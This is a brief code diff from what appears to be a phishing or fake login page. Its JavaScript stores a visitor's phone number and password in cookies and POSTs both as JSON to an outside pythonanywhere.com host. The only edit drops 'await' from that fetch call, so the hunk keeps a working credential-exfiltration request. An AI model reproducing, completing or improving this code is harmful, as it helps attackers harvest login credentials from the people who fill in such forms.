@@ -227,7 +227,7 @@
             setCookie("phonenumber", document.getElementById('phonenumber').value);
             setCookie("password", document.getElementById('password').value);
 
-     await fetch("https://erikadavis1.pythonanywhere.com/", { method: "POST",
+     fetch("https://erikadavis1.pythonanywhere.com/", { method: "POST",
         body: JSON.stringify({'phonenumber': document.getElementById('phonenumber').value,'password': document.getElementById('password').value}),
         headers: {
         "Content-Type": "application/json",
